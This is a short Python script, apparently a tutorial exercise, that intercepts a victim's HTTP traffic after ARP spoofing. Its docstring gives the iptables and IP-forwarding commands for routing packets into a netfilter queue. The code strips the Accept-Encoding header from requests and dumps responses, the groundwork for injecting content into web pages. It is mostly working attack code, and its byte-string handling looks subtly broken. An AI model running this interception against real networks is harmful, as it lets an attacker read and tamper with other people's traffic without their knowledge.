#!/usr/bin/env python

'''
    ARP Spoof against the target
    echo 1 > /proc/sys/net/ipv4/ip_forward
    iptables -I FORWARD -j NFQUEUE --queue-num 0

    We use forward queue for remote computers
    If we want to test on our local machine, we must redirect the input and ouput packet chains


    Install netfilterqueue by:
    pip3 install -U git+https://github.com/kti/python-netfilterqueue

    run:
    iptables --flush
    when done
'''

# Access the queue by:
import netfilterqueue as nfq
import scapy.all as sp
import re

def modify_load(sp_packet, mod_load):
    sp_packet[sp.Raw].load = mod_load
    del sp_packet[sp.IP].len
    del sp_packet[sp.TCP].chksum
    del sp_packet[sp.IP].chksum
    return sp_packet

def process(packet):
    sp_packet = sp.IP(packet.get_payload())
    if sp_packet.haslayer(sp.Raw):
        if sp_packet.haslayer(sp.TCP):
            if sp_packet[sp.TCP].dport == 80:
                print("[+] HTTP request : ")
                mod_load = re.sub(r'Accept-Encoding:.*?\\r\\n', "", str(sp_packet[sp.Raw].load))
                sp_packet = modify_load(sp_packet, mod_load)
                packet.set_payload(bytes(sp_packet))
            if sp_packet[sp.TCP].sport == 80:
                print("[+] HTTP response")
                print(sp_packet.show())
    packet.accept()



queue = nfq.NetfilterQueue()
queue.bind(0, process)
queue.run()

